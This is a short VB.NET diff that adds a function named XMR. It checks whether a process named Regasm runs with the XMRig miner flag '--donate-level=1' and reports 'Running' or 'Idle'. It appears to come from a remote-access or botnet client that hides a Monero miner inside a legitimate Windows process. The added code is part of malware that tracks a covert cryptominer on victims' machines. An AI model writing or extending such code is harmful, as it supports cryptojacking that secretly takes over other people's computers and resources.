@@ -157,6 +157,35 @@
             End Try
         End Function
 
+        Public Shared Function XMR() As String
+            Try
+                If GTV("XMR") = Nothing Then
+                    STV("XMR", "Idle")
+                    Return "Idle"
+                End If
+
+                Dim p() As Diagnostics.Process
+                p = Diagnostics.Process.GetProcessesByName("Regasm")
+                If p.Length > 0 Then
+                    Try
+                        Dim wmiQuery As String = String.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe")
+                        Dim searcher As Management.ManagementObjectSearcher = New Management.ManagementObjectSearcher(wmiQuery)
+                        Dim retObjectCollection As Management.ManagementObjectCollection = searcher.Get
+                        For Each retObject As Management.ManagementObject In retObjectCollection
+                            If retObject("CommandLine").ToString.Contains("--donate-level=1") Then
+                                Return "Running"
+                            End If
+                        Next
+                    Catch ex As Exception
+                    End Try
+                Else
+                    Return "Idle"
+                End If
+
+            Catch ex As Exception
+            End Try
+        End Function
+
     End Class
 
 End Namespace
